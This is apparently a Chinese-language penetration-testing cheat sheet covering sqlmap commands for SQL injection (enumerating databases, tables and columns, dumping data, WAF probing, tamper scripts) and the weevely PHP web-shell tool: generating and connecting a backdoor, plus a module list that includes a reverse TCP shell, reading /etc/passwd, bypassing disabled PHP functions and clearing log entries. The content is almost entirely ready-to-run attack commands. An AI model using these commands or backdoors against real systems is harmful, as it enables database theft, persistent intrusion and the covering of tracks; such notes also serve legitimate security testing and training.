SQLMAP

爆数据库名

sqlmap -r E:\Brup_cap\1.txt --dbs --batch
sqlmap -u <url> --cookie="PHPSESSID=dwqedewfqfrfq;security=low" --dbs //cookie为注入点

爆表名

sqlmap -r 1.txt -D <database_name> --tables --batch

爆字段名

sqlmap -r 1.txt -D <database_name> -T <table_name> --columns --batch

字段内容

sqlmap -r 1.txt -D <database_name> -T <table_name> -C <column1,column2…> --dump --batch

试探WAF

sqlmap -u <url> --identify-waf --batch

tamper脚本

sqlmap -u <url> --tamper <模块名>
脚本位置：~/sqlmap/tamper

weevely

生成后门

weevely generate <password> <file>

连接后门

weevely <url> <password> [cmd]

[cmd]

模块名 注释 模块名 注释
:shell_su 通过更变使用者来执行shell命令，可以获得root权限来执行命令 :bruteforce_sql 可用来猜解数据库密码
:shell_sh 执行 shell 命令 :file_find 查找具有给定名称和属性的文件
:shell_php 执行 PHP 命令 :file_download 从远程文件系统下载文件
:system_extensions 收集PHP和webserver扩展列表 :file_check 获取文件的属性和权限
:system_info 收集系统信息 :file_touch 更改文件时间戳
:system_procs 列出正在运行的进程 :file_cd 更改当前工作目录
:audit_disablefunctionbypass 使用mod_cgi和.htaccess绕过系统禁用函数的限制 :file_grep 打印与多个文件中的模式匹配的行
:audit_etcpasswd 查看/etc/passwd文件 :file_gzip 压缩或解压gzip文件
:audit_suidsgid 查找带有SUID或SGID标志的文件 :file_tar 压缩或解压tar文件
:audit_phpconf 查看php配置信息 :file_enum 检查路径列表的存在和权限
:audit_filesystem 审核文件系统的弱权限(找777权限) :file_cp 复制单个文件
:backdoor_reversetcp 执行反向TCP shell.需要nc -lvp 监听 :file_mount 使用HTTPfs挂载远程文件系统
:backdoor_tcp 在TCP端口上生成shell :file_clearlog 从文件中删除字符串
:net_scan TCP端口扫描 :file_zip 压缩或解压zip文件
:net_mail 发送邮件 :file_upload 文件上载到远程文件系统
:net_ifconfig 获取网络接口地址 :file_upload2web 自动将文件上传到Web文件夹并获取相应的URL
:net_curl 执行类似curl的HTTP请求 :file_edit 在本地编辑器上编辑远程文件
:net_proxy 运行本地代理以通过目标转移HTTP/HTTPS浏览 :file_read 从远程文件系统中读取远程文件
:net_phpproxy 在目标上安装PHP代理 :file_webdownload 指定URL下载文件
:file_ls 列出目录内容 :file_rm 删除远程文件
:sql_dump Multi dbms mysqldump replacement :sql_console 执行SQL查询或运行sql控制台
